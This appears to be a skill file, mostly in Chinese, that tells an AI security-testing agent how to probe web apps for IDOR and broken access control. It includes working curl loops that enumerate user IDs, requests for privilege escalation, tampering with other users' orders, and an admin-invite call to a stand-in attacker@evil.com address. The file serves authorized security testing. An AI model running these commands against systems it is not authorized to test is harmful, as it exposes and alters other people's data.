---
name: idor
description: "越权访问 (IDOR/BAC) 专项测试。Use when: 已有多组不同权限的账号 + 目标有资源标识符 (数字ID/UUID/用户名) 的端点"
allowed-tools:
  - execute
  - http_request
  - browser
  - create_candidate_finding
  - confirm_finding
  - reject_finding
phase: scan
disable_model_invocation: false
---

# IDOR / 越权测试

## Step 1: 候选端点收集

从应用模型中提取所有含资源标识符的端点：
- URL 路径: `/api/users/{id}`, `/orders/{uuid}`, `/files/{name}`
- 查询参数: `?userId=`, `?account_id=`, `?doc=`
- POST body: `{"user_id": 123}`, `{"orderId": "..."}` 
- GraphQL: `query { user(id: 123) { email } }`

## Step 2: 双账号基线

```
# 用 user_A 访问自己的资源 → 记录正常响应
http_request(method="GET", url="/api/users/100", auth_name="user_A")
→ 200 {"id":100, "name":"User A", "email":"a@example.com"}

# 用 user_A 尝试访问 user_B 的资源
http_request(method="GET", url="/api/users/200", auth_name="user_A")
→ 如果 200 + user_B 的数据 = IDOR
```

## Step 3: 批量遍历

```bash
# 遍历连续 ID
for id in $(seq 1 200); do
  status=$(curl -sk -H "Cookie: $SESSION_A" "https://TARGET/api/users/$id" -o /dev/null -w "%{http_code}")
  [ "$status" != "403" ] && [ "$status" != "404" ] && echo "ID $id: $status"
done

# 遍历 UUID (从已知端点收集 UUID 格式)
known_uuids=("abc-123" "def-456")
for uuid in "${known_uuids[@]}"; do
  curl -sk -H "Cookie: $SESSION_A" "https://TARGET/api/orders/$uuid" | head -c 200
done
```

## Step 4: 垂直越权

```
# viewer 尝试管理员操作
http_request(method="GET", url="/admin/users", auth_name="viewer")
http_request(method="GET", url="/api/admin/config", auth_name="viewer")
http_request(method="DELETE", url="/api/users/100", auth_name="viewer")
http_request(method="POST", url="/api/admin/invite", auth_name="viewer", body='{"email":"attacker@evil.com"}')
→ 任何 200 = 垂直越权
```

## Step 5: 参数篡改

```bash
# 修改 POST body 中的标识符
curl -sk -X PUT "https://TARGET/api/orders/100" \
  -H "Cookie: $SESSION_A" \
  -H "Content-Type: application/json" \
  -d '{"orderId": 200, "status": "shipped"}'  # 修改别人的订单

# 修改查询参数
curl -sk "https://TARGET/api/export?userId=200" -H "Cookie: $SESSION_A"

# 数组注入 (批量访问)
curl -sk "https://TARGET/api/users?id[]=100&id[]=200&id[]=300" -H "Cookie: $SESSION_A"
```

发现越权 → `create_candidate_finding(severity="high", vuln_type="idor")`
